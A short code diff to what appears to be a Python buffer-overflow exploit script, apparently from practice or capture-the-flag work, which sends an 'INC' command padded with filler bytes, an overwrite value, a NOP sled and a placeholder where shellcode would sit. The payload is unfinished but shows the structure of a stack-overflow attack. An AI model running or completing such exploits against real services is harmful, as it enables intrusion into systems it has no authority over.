@@ -15,8 +15,14 @@ response = sock.recv(2048)
 print(response)
 
 #try giving input of increasing lengths
-length = 10
-payload = b"INC " + b"A"*length + b"BBBB" + b"C"*10
+length = 20
+buffer = b"INC " + b"A"*length
+overwrite = b"HSOJ"
+nopsled = b"\x90"*100
+
+exploit = b"C"*10
+
+payload = buffer + overwrite + nopsled + exploit
 
 print("Sending Payload of size " + str(length))
 sock.send(payload)
